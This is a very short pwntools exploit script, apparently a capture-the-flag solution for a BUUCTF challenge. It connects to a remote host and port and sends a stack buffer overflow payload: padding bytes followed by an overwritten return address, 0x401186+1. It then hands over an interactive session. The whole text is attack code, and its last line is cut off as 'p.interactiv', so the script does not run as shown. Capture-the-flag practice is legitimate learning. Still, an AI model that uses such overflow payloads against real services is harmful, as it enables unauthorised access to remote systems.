from pwn import *

p = remote("node5.buuoj.cn",27036)
payload=b'A'*(15)+b'B'*(8)+p64(0x401186+1)
p.sendline(payload)
p.interactiv